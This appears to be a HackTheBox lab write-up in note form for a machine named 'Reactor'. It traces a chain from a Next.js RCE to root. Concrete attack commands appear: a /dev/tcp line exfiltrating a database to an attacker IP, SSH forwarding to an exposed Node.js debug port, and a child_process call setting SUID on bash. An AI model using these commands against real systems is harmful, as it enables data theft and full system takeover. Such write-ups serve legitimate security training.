# HackTheBox Reactor Full Chain Penetration Testing

## External Reconnaissance and Web Entry
- Network Mapping:
	- `nmap` scan identified open ports: 22, 3000
	- `3000` identified as Next.js HTTP server
- Web reconnaissance:
	- `next.version` -> `15.0.3`
	- `CVE-2025-55182`: RCE vulnerability in Next.js
- Exploitation:
	- Exploited the vulnerability to achieve Remote Code Execution (RCE)
	- Gaining access to the `node` user

## Database Extraction and Credential Discovery
- Database enumeration:
	- Located `reactor.db`
- Database exfiltration:
	- `cat reactor.db |base64 > /dev/tcp/10.10.15.250/8000`
	- Decoded the database and extracted user information:
		- `(1, 'admin', 'a203xxxx', 'admX', 'admin@reactor.htb')`
		- `(2, 'engineer', '39d9xxxx', 'opX', 'engineer@reactor.htb')`
- Password Cracking:
	- Cracked password for user `engineer`
	- Used recovered credentials to access the machine as `engineer`

## Local Enumeration and Debug Interface
- Socket scan:
	- `ss -tulpn` revealed `127.0.0.1:9229`
- SSH port forwarding:
	- Created port forwarding to access the local Node.js debugging interface
	- `ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb`
- Accessing `http://localhost:9229` resulted in:
	- `WebSockets request was expected`
- Identified port `9229` as a Node.js debugging interface
- Debugger access:
	- `chrome://inspect`
	- Connected to the exposed Node.js process

## Privilege escalation (`engineer` -> `root`)
- The exposed debugging interface allowed arbitrary JavaScript execution
- Used Node.js `child_process` to execute commands:
	- `process.mainModule.require('child_process').exec('chmod +s /bin/bash')`
- This set the SUID bit on `/bin/bash`

## Root Shell
- Executed Bash with preserved privileges:
	- `/bin/bash -p`
- Privilege verification:
	- `id`
	- `uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)`
- `euid=0(root)` and `egid=0(root)` confirmed successful privilege escalation and full system compromise.
